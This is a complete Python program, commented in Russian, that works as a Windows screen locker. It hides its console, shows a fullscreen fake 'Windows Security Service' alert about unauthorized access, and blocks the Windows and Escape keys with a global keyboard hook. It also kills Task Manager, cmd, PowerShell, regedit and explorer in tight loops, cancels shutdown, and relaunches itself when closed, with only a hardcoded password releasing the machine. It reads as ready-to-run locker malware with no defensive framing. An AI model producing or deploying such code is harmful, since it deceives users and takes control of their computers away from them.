import tkinter as tk
from tkinter import messagebox
import os
import sys
import threading
import time
import subprocess
import ctypes
from ctypes import wintypes
import win32gui
import win32con

# Константы Windows
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_ESC = 0x1B

class SystemLocker:
    def __init__(self):
        self.password = "12345"
        self.attempts = 0
        self.max_attempts = 3
        self.keyboard_block = False
        
        # Устанавливаем хуки
        self.setup_keyboard_hook()
        self.create_main_window()
        self.start_protection()

    def setup_keyboard_hook(self):
        """Устанавливает глобальный хук клавиатуры"""
        def low_level_keyboard_handler(nCode, wParam, lParam):
            if nCode >= 0:
                # Получаем код клавиши
                key_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
                
                # Блокируем клавиши Windows и Escape
                if key_code in [VK_LWIN, VK_RWIN, VK_ESC]:
                    return 1  # Блокируем клавишу
            
            # Пропускаем другие клавиши
            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
        
        # Создаем хук
        self.keyboard_hook = ctypes.windll.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)(low_level_keyboard_handler),
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )

    def create_main_window(self):
        """Создает главное окно блокировки"""
        self.root = tk.Tk()
        self.root.title("Windows Security Service")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        
        # Блокируем все способы закрытия
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind('<Alt-F4>', self.do_nothing)
        self.root.bind('<Escape>', self.do_nothing)
        self.root.bind('<Control-Alt-Delete>', self.do_nothing)
        
        self.setup_ui()
        
        # Поднимаем окно поверх всех
        self.root.after(100, self.bring_to_front)

    def bring_to_front(self):
        """Поднимает окно на передний план"""
        try:
            self.root.lift()
            self.root.focus_force()
            # Сильно поднимаем окно
            hwnd = self.root.winfo_id()
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        except:
            pass

    def setup_ui(self):
        """Создает интерфейс"""
        # Заголовок
        title = tk.Label(
            self.root,
            text="🚫 SYSTEM SECURITY LOCK 🚫",
            font=("Arial", 24, "bold"),
            fg="red",
            bg="black"
        )
        title.pack(pady=30)
        
        # Сообщение
        message = tk.Label(
            self.root,
            text="Unauthorized access attempt detected!\n\n"
                 "All system functions have been temporarily disabled\n"
                 "for security reasons.\n\n"
                 "Enter administrator password to restore access:",
            font=("Arial", 14),
            fg="white",
            bg="black",
            justify="center"
        )
        message.pack(pady=20)
        
        # Поле ввода пароля
        self.pass_entry = tk.Entry(
            self.root,
            font=("Arial", 18),
            show="*",
            width=20
        )
        self.pass_entry.pack(pady=20)
        self.pass_entry.focus()
        self.pass_entry.bind('<Return>', lambda e: self.check_password())
        
        # Кнопка разблокировки
        btn = tk.Button(
            self.root,
            text="UNLOCK SYSTEM",
            font=("Arial", 14, "bold"),
            command=self.check_password,
            bg="green",
            fg="white",
            width=18,
            height=2
        )
        btn.pack(pady=10)
        
        # Счетчик попыток
        self.counter = tk.Label(
            self.root,
            text=f"Attempts: {self.attempts}/{self.max_attempts}",
            font=("Arial", 12),
            fg="yellow",
            bg="black"
        )
        self.counter.pack(pady=5)

    def do_nothing(self, event=None):
        """Игнорирует все попытки закрытия"""
        messagebox.showwarning("Access Denied", "System shutdown is not allowed!")
        return "break"

    def check_password(self):
        """Проверяет пароль"""
        if self.pass_entry.get() == self.password:
            self.unlock()
        else:
            self.attempts += 1
            self.counter.config(text=f"Attempts: {self.attempts}/{self.max_attempts}")
            self.pass_entry.delete(0, tk.END)
            
            if self.attempts >= self.max_attempts:
                self.hard_lock()
            else:
                messagebox.showerror("Error", 
                                   f"Invalid password!\nRemaining attempts: {self.max_attempts - self.attempts}")

    def hard_lock(self):
        """Жесткая блокировка системы"""
        messagebox.showerror("PERMANENT LOCK", 
                           "SYSTEM PERMANENTLY LOCKED!\n"
                           "Contact system administrator.")
        
        # Включаем усиленную защиту
        self.keyboard_block = True
        threading.Thread(target=self.enhanced_protection, daemon=True).start()

    def enhanced_protection(self):
        """Усиленная защита системы"""
        while True:
            try:
                # Блокируем все системные процессы
                self.kill_system_tools()
                
                # Закрываем меню Пуск и другие системные окна
                self.close_start_menu()
                
                # Блокируем диалоги выключения
                self.block_shutdown_dialogs()
                
            except:
                pass
            time.sleep(0.5)

    def kill_system_tools(self):
        """Убивает системные утилиты"""
        targets = [
            "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe",
            "msconfig.exe", "procexp.exe", "explorer.exe", "mmc.exe"
        ]
        
        for target in targets:
            os.system(f"taskkill /f /im {target} 2>nul")

    def close_start_menu(self):
        """Закрывает меню Пуск и системные меню"""
        try:
            # Закрываем меню Пуск
            os.system("taskkill /f /im StartMenuExperienceHost.exe 2>nul")
            
            # Закрываем панель задач
            os.system("taskkill /f /im ShellExperienceHost.exe 2>nul")
            
            # Закрываем системные диалоги
            def close_system_windows(hwnd, extra):
                try:
                    title = win32gui.GetWindowText(hwnd)
                    # Закрываем системные окна
                    system_windows = ["Пуск", "Start", "Завершение работы", "Shutdown", "Сеанс", "Session"]
                    if any(word in title for word in system_windows):
                        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                except:
                    pass
            
            win32gui.EnumWindows(close_system_windows, None)
            
        except:
            pass

    def block_shutdown_dialogs(self):
        """Блокирует диалоги завершения работы"""
        try:
            # Отменяем выключение
            os.system("shutdown /a 2>nul")
            
            # Закрываем диалог выключения
            hwnd = win32gui.FindWindow(None, "Завершение работы Windows")
            if hwnd:
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                
        except:
            pass

    def start_protection(self):
        """Запускает все системы защиты"""
        # Убийца процессов
        threading.Thread(target=self.process_killer, daemon=True).start()
        
        # Защита от выключения
        threading.Thread(target=self.shutdown_protector, daemon=True).start()
        
        # Блокировщик меню Пуск
        threading.Thread(target=self.start_menu_blocker, daemon=True).start()
        
        # Самовосстановление
        threading.Thread(target=self.self_heal, daemon=True).start()

    def process_killer(self):
        """Постоянно убивает системные утилиты"""
        while True:
            self.kill_system_tools()
            time.sleep(0.3)

    def shutdown_protector(self):
        """Постоянно блокирует выключение"""
        while True:
            self.block_shutdown_dialogs()
            time.sleep(1)

    def start_menu_blocker(self):
        """Постоянно блокирует меню Пуск"""
        while True:
            self.close_start_menu()
            time.sleep(0.5)

    def self_heal(self):
        """Самовосстановление приложения"""
        time.sleep(5)
        while True:
            try:
                if not self.root.winfo_exists():
                    self.restart()
                    break
            except:
                self.restart()
                break
            time.sleep(3)

    def restart(self):
        """Перезапускает приложение"""
        try:
            subprocess.Popen([sys.executable, __file__])
        except:
            subprocess.Popen([sys.argv[0]])
        sys.exit(0)

    def unlock(self):
        """Разблокирует систему"""
        # Убираем хук клавиатуры
        try:
            ctypes.windll.user32.UnhookWindowsHookEx(self.keyboard_hook)
        except:
            pass
        
        messagebox.showinfo("SYSTEM UNLOCKED", 
                          "✅ System successfully unlocked!\n\n"
                          "Password: 12345\n"
                          "All functions restored.")
        
        self.root.quit()
        os._exit(0)

    def run(self):
        """Запускает приложение"""
        self.root.mainloop()

if __name__ == "__main__":
    # Скрываем консоль
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    # Запускаем блокировщик
    app = SystemLocker()
    app.run()